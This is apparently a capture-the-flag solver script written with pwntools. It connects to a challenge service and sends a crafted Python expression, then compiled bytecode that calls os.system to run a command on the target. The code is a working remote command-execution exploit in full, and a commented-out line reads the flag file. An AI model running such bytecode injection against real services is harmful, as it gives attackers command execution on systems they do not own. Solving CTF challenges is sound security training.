import argparse
import code

from pwn import *

parser = argparse.ArgumentParser()
parser.add_argument("address", default="127.0.0.1:8000", help="Address of challenge")
args = parser.parse_args()
HOST, PORT = args.address.split(':')

r = remote(HOST, int(PORT), level='debug')
#PATH = '../challenge/src/challenge.py'
#r = process(PATH, level='debug')

#command_string = "cat flag.txt"
command_string = "./submitter 0"

shellcode = code.compile_command(f'import os; os.system("{command_string}")')
bytecode = shellcode.co_code.hex()
# Constants: 0, None, 'command_string'
# Names: os, system

keyword = 'omelet'
initial_input = f'0 + None + "{command_string}" + os + system + {keyword}'

r.recvuntil(b'~===========<8>~ Enter Python code:\n')
r.sendline(initial_input)


r.recvuntil(b'defend the eggs:\n')
r.sendline(bytecode)

r.interactive()
